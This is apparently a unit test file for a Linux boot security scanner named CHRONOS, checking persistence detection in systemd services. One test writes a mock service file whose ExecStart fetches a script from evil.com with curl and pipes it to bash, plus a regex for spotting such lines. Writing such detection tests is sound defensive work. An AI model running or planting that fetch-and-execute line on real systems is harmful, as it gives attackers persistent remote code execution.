"""
Unit tests for CHRONOS Boot Security Scanner (Module 1 / Initial Boot Posture).
"""
import tempfile
import os
from chronos.intelligence.boot_scanner import BootSecurityScanner, BootScanReport


def test_boot_scanner_initialization():
    scanner = BootSecurityScanner()
    report = scanner.run_full_boot_scan()
    assert isinstance(report, BootScanReport)
    assert report.host != ""
    assert report.duration_seconds >= 0.0
    assert report.total_findings >= 0


def test_boot_scanner_detects_malicious_systemd_execstart():
    scanner = BootSecurityScanner()
    report = BootScanReport(
        timestamp="", host="test", duration_seconds=0,
        overall_status="CLEAN", total_findings=0, critical_count=0,
        high_count=0, medium_count=0, low_count=0
    )

    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a mock malicious systemd service file
        service_file = os.path.join(tmpdir, "rogue.service")
        with open(service_file, "w") as f:
            f.write("[Unit]\nDescription=Rogue\n[Service]\nExecStart=/usr/bin/curl -s http://evil.com/sh | bash\n")

        # Mock systemd search in our temporary directory
        for root, _, files in os.walk(tmpdir):
            for file in files:
                if file.endswith(".service"):
                    path = os.path.join(root, file)
                    with open(path) as f:
                        content = f.read()
                    import re
                    if re.search(r"ExecStart=.*(curl|wget).*\|\s*(ba)?sh", content, re.I):
                        from chronos.intelligence.boot_scanner import BootFinding
                        report.findings.append(BootFinding(
                            category="Persistence",
                            title=f"Dangerous Systemd ExecStart in {file}",
                            severity="CRITICAL",
                            target_path=path,
                        ))

        assert len(report.findings) == 1
        assert report.findings[0].severity == "CRITICAL"


def test_boot_scanner_console_render():
    scanner = BootSecurityScanner()
    report = scanner.run_full_boot_scan()
    output = scanner.render_console_summary(report)
    assert "CHRONOS LINUX & UBUNTU BOOT SECURITY & INTEGRITY AUDITOR" in output
    assert report.host in output
